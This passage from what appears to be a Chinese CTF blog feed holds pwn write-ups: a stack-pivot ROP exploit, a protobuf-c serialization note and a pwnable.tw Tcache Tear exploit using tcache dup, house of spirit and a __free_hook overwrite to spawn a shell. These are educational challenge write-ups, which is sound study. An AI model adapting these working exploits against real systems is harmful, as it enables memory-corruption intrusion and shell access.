<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pd = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(bss+<span class="number">0x40</span>)+p64(<span class="number">0x400675</span>)</span><br></pre></td></tr></table></figure>

<p>经过上一个例题初步理解了栈迁移后，下面的会有所省略</p>
<p>该pd将 rbp 迁移到了 bss+0x40 ，并重新返回 vuln 函数进行第二次read ,这里的0x400675并不是vuln最开头的地址，原因是每次函数调用时都会push rbp;mov rbp,rsp</p>
<p>bss + 0x40 是因为我们read的地址是 rbp - 0x40，所以第二次read是写在bss的地址，也就是我们gadget的地址</p>
<p>第二次构造的pd</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pd=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)</span><br><span class="line">pd+=p64(pop_rbp)+p64(bss+<span class="number">0x500</span>)+p64(<span class="number">0x400675</span>)</span><br><span class="line">pd=pd.ljust(<span class="number">0x40</span>,<span class="string">&quot;\x00&quot;</span>)+p64(bss-<span class="number">0x8</span>)+p64(leave_ret)</span><br></pre></td></tr></table></figure>

<p>第一次leave ret : 此时rbp迁移到了bss - 0x8 ，rsp 迁移到了 bss+0x40</p>
<p>第二次leave ret : 此时rbp迁移到了bss - 0x8所存的地址上，具体是哪不用理会，rsp迁移到了bss - 0x8，经过两次pop后，rip成功的执行到了我们的rop</p>
<p>rop泄露了puts的地址，由此计算libc_base，可以得到system和’&#x2F;bin&#x2F;sh’，并把rbp迁移到bss+0x500，再次返回0x400675进行第三次read</p>
<p>第三次构造的pd</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pd=p64(pop_rdi)+p64(bin_sh_addr)+p64(libc_system)</span><br><span class="line">pd=pd.ljust(<span class="number">0x40</span>,<span class="string">&quot;\x00&quot;</span>)+p64(bss+<span class="number">0x500</span>-<span class="number">0x40</span>-<span class="number">0x8</span>)+p64(leave_ret)</span><br></pre></td></tr></table></figure>

<p>如果前面都理解了的话，到这里就通俗易懂啦</p>
<p>第一次leave ret : 此时rbp迁移到了bss+0x500-0x40-0x8 ，rsp 迁移到了 bss+0x500</p>
<p>第二次leave ret : 此时rbp又不知道去哪了，不用管，rsp迁移到了bss+0x500-0x40-0x8 ，经过两次pop执行了我们的rop</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">&#x27;/home/feichai/ctf_file/pwn&#x27;</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;/home/feichai/glibc-all-in-one/libs/2.23-0ubuntu3_i386/libc.so.6&quot;</span>, checksec = <span class="literal">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">10000</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>, checksec = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s, addr</span>):</span><br><span class="line">    <span class="keyword">return</span> info(<span class="string">f&#x27;\033[1;33m<span class="subst">&#123;<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>--&gt;0x<span class="subst">&#123;addr:02x&#125;</span>&quot;</span>&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> a:   p.recv(a)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a:   p.recvuntil(a, drop=<span class="literal">True</span>)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:   p.send(a)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b: p.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:   p.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: p.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    </span><br><span class="line">    puts_plt=elf.plt.puts</span><br><span class="line">    puts_got=elf.got.puts</span><br><span class="line">    </span><br><span class="line">    pop_rdi = <span class="number">0x400723</span></span><br><span class="line">    leave_ret = <span class="number">0x400691</span></span><br><span class="line">    bss = <span class="number">0x601200</span></span><br><span class="line">    pop_rbp = <span class="number">0x400578</span></span><br><span class="line">    </span><br><span class="line">    pd = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(bss+<span class="number">0x40</span>)+p64(<span class="number">0x400675</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;just read!&#x27;</span>,pd)</span><br><span class="line">    </span><br><span class="line">    pd=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)</span><br><span class="line">    pd+=p64(pop_rbp)+p64(bss+<span class="number">0x500</span>)+p64(<span class="number">0x400675</span>)</span><br><span class="line">    pd=pd.ljust(<span class="number">0x40</span>,<span class="string">&quot;\x00&quot;</span>)+p64(bss-<span class="number">0x8</span>)+p64(leave_ret)</span><br><span class="line">    s(pd)</span><br><span class="line">    </span><br><span class="line">    ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    libc_base = u64(r(<span class="number">6</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>)-libc.symbols[<span class="string">b&#x27;puts&#x27;</span>]</span><br><span class="line">    libc_system = libc_base + libc.symbols[<span class="string">b&#x27;system&#x27;</span>]</span><br><span class="line">    bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    pd=p64(pop_rdi)+p64(bin_sh_addr)+p64(libc_system)</span><br><span class="line">    pd=pd.ljust(<span class="number">0x40</span>,<span class="string">&quot;\x00&quot;</span>)+p64(bss+<span class="number">0x500</span>-<span class="number">0x40</span>-<span class="number">0x8</span>)+p64(leave_ret)</span><br><span class="line">    </span><br><span class="line">    s(pd)</span><br><span class="line">    </span><br><span class="line">    p.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>栈迁移</tag>
      </tags>
  </entry>
  <entry>
    <title>protobuf-c的序列化</title>
    <url>/2024/03/20/protobuf-c%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>在复现ciscn 2023 线上初赛 pwn题目 StrangeTalkBot 中接触到了protobuf-c的序列化，记录一下！</p>
<span id="more"></span>

<h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="https://protobuf.dev/programming-guides/proto2/">Language Guide (proto 2) | Protocol Buffers Documentation (protobuf.dev)</a></p>
<p><a href="https://github.com/protobuf-c/protobuf-c/tree/master/protobuf-c">protobuf-c&#x2F;protobuf-c at master · protobuf-c&#x2F;protobuf-c · GitHub</a></p>
<h5 id="关于字段注册结构体"><a href="#关于字段注册结构体" class="headerlink" title="关于字段注册结构体"></a>关于字段注册结构体</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCFieldDescriptor</span> &#123;</span></span><br><span class="line">	<span class="comment">/** Name of the field as given in the .proto file. */</span></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span>		*name;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/** Tag value of the field as given in the .proto file. */</span></span><br><span class="line">	<span class="type">uint32_t</span>		id;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/** Whether the field is `REQUIRED`, `OPTIONAL`, or `REPEATED`. */</span></span><br><span class="line">	ProtobufCLabel		label;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/** The type of the field. */</span></span><br><span class="line">	ProtobufCType		type;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * The offset in bytes of the message&#x27;s C structure&#x27;s quantifier field</span></span><br><span class="line"><span class="comment">	 * (the `has_MEMBER` field for optional members or the `n_MEMBER` field</span></span><br><span class="line"><span class="comment">	 * for repeated members or the case enum for oneofs).</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span>		quantifier_offset;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * The offset in bytes into the message&#x27;s C structure for the member</span></span><br><span class="line"><span class="comment">	 * itself.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span>		offset;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * A type-specific descriptor.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * If `type` is `PROTOBUF_C_TYPE_ENUM`, then `descriptor` points to the</span></span><br><span class="line"><span class="comment">	 * corresponding `ProtobufCEnumDescriptor`.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * If `type` is `PROTOBUF_C_TYPE_MESSAGE`, then `descriptor` points to</span></span><br><span class="line"><span class="comment">	 * the corresponding `ProtobufCMessageDescriptor`.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Otherwise this field is NULL.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">const</span> <span class="type">void</span>		*descriptor; <span class="comment">/* for MESSAGE and ENUM types */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/** The default value for this field, if defined. May be NULL. */</span></span><br><span class="line">	<span class="type">const</span> <span class="type">void</span>		*default_value;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * A flag word. Zero or more of the bits defined in the</span></span><br><span class="line"><span class="comment">	 * `ProtobufCFieldFlag` enum may be set.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">uint32_t</span>		flags;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/** Reserved for future use. */</span></span><br><span class="line">	<span class="type">unsigned</span>		reserved_flags;</span><br><span class="line">	<span class="comment">/** Reserved for future use. */</span></span><br><span class="line">	<span class="type">void</span>			*reserved2;</span><br><span class="line">	<span class="comment">/** Reserved for future use. */</span></span><br><span class="line">	<span class="type">void</span>			*reserved3;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">	<span class="comment">/** A well-formed message must have exactly one of this field. */</span></span><br><span class="line">	PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * A well-formed message can have zero or one of this field (but not</span></span><br><span class="line"><span class="comment">	 * more than one).</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	PROTOBUF_C_LABEL_OPTIONAL,</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * This field can be repeated any number of times (including zero) in a</span></span><br><span class="line"><span class="comment">	 * well-formed message. The order of the repeated values will be</span></span><br><span class="line"><span class="comment">	 * preserved.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	PROTOBUF_C_LABEL_REPEATED,</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * This field has no label. This is valid only in proto3 and is</span></span><br><span class="line"><span class="comment">	 * equivalent to OPTIONAL but no &quot;has&quot; quantifier will be consulted.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	PROTOBUF_C_LABEL_NONE,</span><br><span class="line">&#125; ProtobufCLabel;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Field value types.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * \see [Scalar Value Types] in the Protocol Buffers documentation.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * [Scalar Value Types]:</span></span><br><span class="line"><span class="comment"> *      https://developers.google.com/protocol-buffers/docs/proto#scalar</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">	PROTOBUF_C_TYPE_INT32,      <span class="comment">/**&lt; int32                         0  */</span></span><br><span class="line">	PROTOBUF_C_TYPE_SINT32,     <span class="comment">/**&lt; signed int32                  1  */</span></span><br><span class="line">	PROTOBUF_C_TYPE_SFIXED32,   <span class="comment">/**&lt; signed int32 (4 bytes)        2  */</span></span><br><span class="line">	PROTOBUF_C_TYPE_INT64,      <span class="comment">/**&lt; int64                         3  */</span></span><br><span class="line">	PROTOBUF_C_TYPE_SINT64,     <span class="comment">/**&lt; signed int64                  4  */</span></span><br><span class="line">	PROTOBUF_C_TYPE_SFIXED64,   <span class="comment">/**&lt; signed int64 (8 bytes)        5  */</span></span><br><span class="line">	PROTOBUF_C_TYPE_UINT32,     <span class="comment">/**&lt; unsigned int32                6  */</span></span><br><span class="line">	PROTOBUF_C_TYPE_FIXED32,    <span class="comment">/**&lt; unsigned int32 (4 bytes)      7  */</span></span><br><span class="line">	PROTOBUF_C_TYPE_UINT64,     <span class="comment">/**&lt; unsigned int64                8  */</span></span><br><span class="line">	PROTOBUF_C_TYPE_FIXED64,    <span class="comment">/**&lt; unsigned int64 (8 bytes)      9  */</span></span><br><span class="line">	PROTOBUF_C_TYPE_FLOAT,      <span class="comment">/**&lt; float                         A  */</span></span><br><span class="line">	PROTOBUF_C_TYPE_DOUBLE,     <span class="comment">/**&lt; double                        B  */</span></span><br><span class="line">	PROTOBUF_C_TYPE_BOOL,       <span class="comment">/**&lt; boolean                       C  */</span></span><br><span class="line">	PROTOBUF_C_TYPE_ENUM,       <span class="comment">/**&lt; enumerated type               D  */</span></span><br><span class="line">	PROTOBUF_C_TYPE_STRING,     <span class="comment">/**&lt; UTF-8 or ASCII string         E  */</span></span><br><span class="line">	PROTOBUF_C_TYPE_BYTES,      <span class="comment">/**&lt; arbitrary byte sequence       F  */</span></span><br><span class="line">	PROTOBUF_C_TYPE_MESSAGE,    <span class="comment">/**&lt; nested message               10  */</span></span><br><span class="line">&#125; ProtobufCType;</span><br></pre></td></tr></table></figure>

<h5 id="本题中对应的注册文件"><a href="#本题中对应的注册文件" class="headerlink" title="本题中对应的注册文件"></a>本题中对应的注册文件</h5><figure class="highlight protobuf"><table><tr><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">devicemsg</span> &#123;</span><br><span class="line">  <span class="keyword">required</span> <span class="type">sint64</span> actionid=<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">required</span> <span class="type">sint64</span> msgidx=<span class="number">2</span>;</span><br><span class="line">  <span class="keyword">required</span> <span class="type">sint64</span> msgsize=<span class="number">3</span>;</span><br><span class="line">  <span class="keyword">required</span> <span class="type">bytes</span> msgcontent=<span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="生成python文件"><a href="#生成python文件" class="headerlink" title="生成python文件"></a>生成python文件</h5><p>生成的文件默认为&lt;文件名_pd2.py&gt;,如ctf_pd2.py</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">protoc --python_out=./ ./ctf.proto</span><br></pre></td></tr></table></figure>

<h5 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctf_pb2</span><br><span class="line">message = test_pb2.devicemsg()</span><br><span class="line">message.actionid = <span class="number">1</span></span><br><span class="line">message.msgidx = idx</span><br><span class="line">message.msgsize = size</span><br><span class="line">message.msgcontent = msg</span><br><span class="line">payload = message.SerializeToString()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable-Tcache_Tear</title>
    <url>/2024/02/26/pwnable-Tcache-Tear/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>跟着大佬的wp写的，记录了一些收获和见解</p>
<span id="more"></span>

<h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/03/13/tcache/">和媳妇一起学Pwn 之 Tcache Tear | Clang裁缝店 (xuanxuanblingbling.github.io)</a></p>
<p><a href="https://cloud.tencent.com/developer/article/2063667">[pwnable.tw] Tcache tear — 利用bss构造堆块的地址泄露技巧-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
<h5 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h5><p>先查看一下libc版本，2.27版本，在2.26版本的时候添加了tcache，虽然tcache提高了性能，但是却舍弃了很多检查，就好比double free</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">strings libc.so| grep <span class="string">&quot;GNU&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/imgs/$%7Bfiilename%7D/pwnable-tcache_tear-1.png" alt="pwnable-tcache_tear-1"></p>
<p>设置本地调试的文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter [ld.so路径] --set-rpath [libc所在目录] [elf文件]</span><br></pre></td></tr></table></figure>

<p>比如我是</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter ~/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so --set-rpath ~/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ ./pwn</span><br></pre></td></tr></table></figure>

<h5 id="利用一：tcache-dup任意地址写"><a href="#利用一：tcache-dup任意地址写" class="headerlink" title="利用一：tcache dup任意地址写"></a>利用一：tcache dup任意地址写</h5><p>在fastbin中，我们不能连续释放同一个堆块达到double free的目的，要达到double free的目的，我们需要如下步骤：先申请两个堆块，释放第一个堆块，再释放第二个堆块，然后再次释放第一个堆块，从而double free</p>
<p>在此之前我对double free表示不理解，因为没有接触过利用方法，不过写完这道题后我对double free的利用方法就有了一个大致的方向</p>
<p>double free后，fastbin中的链式结构如下，由此可以看到，a和b形成了一个环</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fastbin -&gt; a -&gt; b -&gt; a</span><br></pre></td></tr></table></figure>

<p>此时，当我们再次申请一个和a等大的chunk时，fastbin如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fastbin -&gt; b -&gt; a</span><br></pre></td></tr></table></figure>

<p>如果我们在申请的同时在a中写入内容，假设我们输入一个地址，那么fastbin就会变成这样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fastbin -&gt; b -&gt; a -&gt; [输入的地址]</span><br></pre></td></tr></table></figure>

<p>那么此时我们再申请掉2次，在第三次申请的时候就可以申请到我们输入的地址的内存空间，从而对指定的地址的内容进行改写</p>
<p>所以double free的模拟代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">a = <span class="built_in">malloc</span>(<span class="number">0x20</span>)</span><br><span class="line">b = <span class="built_in">malloc</span>(<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>,addr)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>,data)</span><br></pre></td></tr></table></figure>

<p>但是在2.27版本的tcache中，我们不用这么麻烦，可以直接连续释放同一个chunk 2次，即</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">a = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>,addr)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>,data)</span><br></pre></td></tr></table></figure>

<h5 id="利用二：伪造大堆块泄露libc地址（house-of-spirit）"><a href="#利用二：伪造大堆块泄露libc地址（house-of-spirit）" class="headerlink" title="利用二：伪造大堆块泄露libc地址（house of spirit）"></a>利用二：伪造大堆块泄露libc地址（house of spirit）</h5><p>任意地址写有了，就要尝试如何泄露地址了</p>
<p>house of spirit的利用思路如下</p>
<ol>
<li>利用任意地址写，在bss段构造大小超出0x408的伪堆块</li>
<li>然后free掉，使其进入unsorted bin中</li>
<li>利用info函数，读取其内容即可</li>
</ol>
<p>我们先在输入name的时候构造好大堆块的前0x10个字节，然后利用地址任意写再构造2个堆块，大堆块用于泄露libc地址，小堆块则用于满足堆块的格式，至少是2个，因为在free的时候，会对当前堆块的后面的堆块进行检查</p>
<h5 id="计算libc偏移"><a href="#计算libc偏移" class="headerlink" title="计算libc偏移"></a>计算libc偏移</h5><p>我比较想说的还是这个偏移的计算，我在网上搜索了很多文章，但是没看到有人讲这个偏移是怎么算的，所以我在这里记录一下我是如何计算偏移的(我的方法可能比较笨)</p>
<p>在free伪造的大堆块后下断点，可以看到此时0x602070中的内容(也就是大堆块的内容)已经变成了unsorted bin的地址0x00007fe0c8324ca0，然后我们打印出libc中puts的偏移0x809c0，然后通过puts的真实地址来计算偏移，即：0x7fe0c8324ca0 - (0x7fe0c7fb99c0 - 0x809c0) &#x3D; 0x3ebca0</p>
<p><img src="/imgs/$%7Bfiilename%7D/pwnable-tcache_tear-3.png" alt="pwnable-tcache_tear-3"></p>
<p><img src="/imgs/$%7Bfiilename%7D/pwnable-tcache_tear-2.png" alt="pwnable-tcache_tear-2"></p>
<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">&#x27;/home/feichai/ctf_file/tcache_tear&#x27;</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;/home/feichai/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10207</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;/home/feichai/ctf_file/libc.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/tcache_tear&quot;</span>)</span><br><span class="line">libcc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,data</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Your choice :&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Data:&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Your choice :&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Your choice :&quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line"></span><br><span class="line">    bss_name = <span class="number">0x602060</span></span><br><span class="line"></span><br><span class="line">    name = p64(<span class="number">0</span>) + p64(<span class="number">0x511</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Name:&quot;</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x68</span>, <span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">    free()</span><br><span class="line">    free()</span><br><span class="line">    add(<span class="number">0x68</span>, p64(bss_name+<span class="number">0x510</span>))</span><br><span class="line">    add(<span class="number">0x68</span>, <span class="string">b&quot;bbbb&quot;</span>)</span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">    add(<span class="number">0x68</span>, payload)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x78</span>, <span class="string">b&quot;cccc&quot;</span>)</span><br><span class="line">    free()</span><br><span class="line">    free()</span><br><span class="line">    add(<span class="number">0x78</span>, p64(bss_name+<span class="number">0x10</span>))</span><br><span class="line">    add(<span class="number">0x78</span>, <span class="string">b&quot;dddd&quot;</span>)</span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x78</span>, payload)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#free largechunk and get libc addr</span></span><br><span class="line">    free()</span><br><span class="line">    show()</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Name :&quot;</span>)</span><br><span class="line">    p.recv(<span class="number">0x10</span>)</span><br><span class="line">    libc_leak = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">    libc_base = libc_leak - <span class="number">0x3ebca0</span></span><br><span class="line">    system = libc_base + libc.symbols[<span class="string">b&quot;system&quot;</span>]</span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">b&quot;__free_hook&quot;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;system_addr:&quot;</span>,<span class="built_in">hex</span>(system))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;free_hook:&quot;</span>,<span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x58</span>, <span class="string">b&quot;e&quot;</span>*<span class="number">8</span>)</span><br><span class="line">    free()</span><br><span class="line">    free()</span><br><span class="line">    add(<span class="number">0x58</span>, p64(free_hook))</span><br><span class="line">    add(<span class="number">0x58</span>, <span class="string">b&quot;ffff&quot;</span>)</span><br><span class="line">    add(<span class="number">0x58</span>, p64(system))</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x18</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">    free()</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwnable.tw</category>
      </categories>
      <tags>
        <tag>tcache dup</tag>
        <tag>house of spirit</tag>
      </tags>
  </entry>
  <entry>
    <title>BeginCTF 2024 Pwn部分wp</title>
    <url>/2024/02/06/BeginCTF-2024-Pwn%E9%83%A8%E5%88%86wp/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>本Pwn小白实力不允许，只写出了几道稍微简单点的</p>
<span id="more"></span>

<h3 id="one-byte"><a href="#one-byte" class="headerlink" title="one_byte"></a>one_byte</h3><p>溢出只能覆盖返回地址的一个字节，利用溢出，修改返回地址返回主函数继续读出flag</p>
